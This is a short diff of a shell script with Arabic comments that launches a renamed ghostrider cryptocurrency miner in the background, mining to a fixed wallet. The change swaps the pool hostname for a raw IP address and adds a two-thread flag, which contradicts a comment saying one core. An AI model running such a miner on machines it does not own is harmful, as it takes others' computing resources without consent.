@@ -3,7 +3,7 @@
 # إعداد بيانات المحفظة والمسبح
 WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"   # ← عدّلها لمحفظتك
 WORKER="x" 
-POOL="ghostrider.mine.zergpool.com:5354"
+POOL="51.91.7.170:5354"
 ALGORITHM="ghostrider"
 THREADS=
 
@@ -19,4 +19,4 @@ tar -xvf hurricane.tar.gz --strip=1
 rm hurricane.tar.gz
 
 # تشغيل المعدّن في الخلفية بنواة واحدة
-nohup ./hurricane -a ghostrider --url ghostrider.mine.zergpool.com:5354 --user NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT -p c=XNA,zap=FBIT > cpu_output.log 2>&1 &
+nohup ./hurricane -a ghostrider --url 51.91.7.170:5354 --user NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT -p c=XNA,zap=FBIT -t 2 > cpu_output.log 2>&1 &
